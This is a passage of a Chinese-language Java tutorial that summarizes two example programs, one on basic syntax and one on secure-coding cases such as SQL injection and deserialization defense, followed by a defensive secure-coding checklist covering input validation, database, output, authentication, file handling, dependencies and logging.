`code/` 目录下包含两个 Java 示例程序：

| 文件 | 内容 | 编译运行 |
|------|------|---------|
| `Basics.java` | Java 基础语法示例：变量、数据类型、流程控制、类与对象、集合、异常处理、文件 I/O | `javac Basics.java && java Basics` |
| `SecurityCases.java` | 安全案例集：反序列化漏洞演示与防御、SQL 注入防御、输入验证、安全编码实践 | `javac SecurityCases.java && java SecurityCases` |

### 7.1 Basics.java 内容概览

- 变量与数据类型（8 种基本类型 + 包装类）
- 运算符与比较（`==` vs `equals` 的区别）
- 流程控制（if/switch/for/while/增强 for）
- 类与对象（封装、继承、多态、接口）
- 集合框架（List/Set/Map + Stream API）
- 异常处理（try-catch-finally + try-with-resources）
- 文件 I/O（传统 IO + NIO.2）

### 7.2 SecurityCases.java 内容概览

| 案例 | 功能 | 说明 |
|------|------|------|
| **反序列化漏洞防御** | 危险版本对比 + 白名单类过滤 + JSON 替代方案 | 理解反序列化原理，掌握防御方法 |
| **SQL 注入防御** | Statement 拼接 vs PreparedStatement 参数化查询 | 理解 SQL 注入，掌握参数化查询 |
| **输入验证安全** | 白名单验证、正则验证、类型检查 | 掌握安全的输入验证方法 |
| **安全编码实践** | XSS 转义、密码哈希、安全随机数 | 日常安全编码最佳实践 |

> **运行注意**：
> - 需要 JDK 8+ 环境（推荐 JDK 17 或 21）
> - 编译：`javac Basics.java`
> - 运行：`java Basics`
> - SecurityCases.java 需要额外的 JSON 库依赖（如 Jackson）才能运行完整功能，基础示例无需额外依赖

---

## 附：Java 安全编码检查清单

### 输入验证

- [ ] 所有外部输入都进行验证（HTTP 参数、Header、Cookie、文件上传、RPC 参数）
- [ ] 使用白名单验证，而非黑名单
- [ ] 验证数据类型、长度、范围、格式
- [ ] 使用 Bean Validation（JSR-380）注解进行声明式验证
- [ ] 验证失败时拒绝请求，不尝试修复

### 数据库安全

- [ ] 所有数据库查询使用 PreparedStatement 参数化查询
- [ ] 禁止使用 Statement 拼接 SQL
- [ ] 数据库账号使用最小权限原则
- [ ] 生产环境不显示详细的数据库错误信息
- [ ] 敏感字段加密存储
- [ ] 密码使用 BCrypt/Argon2 等慢哈希算法

### 输出安全

- [ ] 输出到 HTML 时使用 `HtmlUtils.htmlEscape()` 转义
- [ ] 输出到 JavaScript 时使用 JSON 序列化
- [ ] 设置 Content-Security-Policy 响应头
- [ ] 设置 X-Content-Type-Options: nosniff
- [ ] 设置 X-Frame-Options: DENY

### 反序列化安全

- [ ] 避免使用 Java 原生序列化
- [ ] 使用 JSON/Protobuf 等安全数据格式
- [ ] 必须使用时实现白名单类过滤
- [ ] 配置全局反序列化过滤器（`jdk.serialFilter`）
- [ ] 定期审计 `ObjectInputStream.readObject()` 调用

### 认证与授权

- [ ] 认证逻辑集中管理，不分散在各个 Controller
- [ ] 使用成熟的安全框架（Spring Security、Apache Shiro）
- [ ] 密码使用强哈希算法（BCrypt、Argon2）
- [ ] Session 安全配置（HttpOnly、Secure、SameSite）
- [ ] 接口级别的权限校验（不依赖前端控制）
- [ ] 防止越权访问（水平越权、垂直越权）

### 文件操作安全

- [ ] 文件上传白名单校验扩展名
- [ ] 校验 MIME 类型和文件内容
- [ ] 随机生成文件名
- [ ] 上传目录禁止执行脚本
- [ ] 防止路径遍历（`../`）
- [ ] 文件下载验证权限

### 依赖与组件安全

- [ ] 使用 Maven/Gradle 管理依赖
- [ ] 定期更新依赖版本
- [ ] 使用 Dependency-Check 或 Snyk 扫描依赖漏洞
- [ ] 移除未使用的依赖
- [ ] 关注第三方组件的安全公告

### 日志与错误处理

- [ ] 不记录敏感信息（密码、身份证号、银行卡号等）
- [ ] 生产环境不向用户显示堆栈跟踪
- [ ] 使用参数化日志（`log.info("User: {}", user)`）
- [ ] 安全事件有专门的日志
- [ ] 日志有完整性保护

---

> **免责声明**：本文档所有内容仅用于学习、研究和授权环境下的安全测试与防御实践。任何未经授权的测试或攻击行为均属违法。读者应遵守所在地区法律法规，对自己的行为负责。
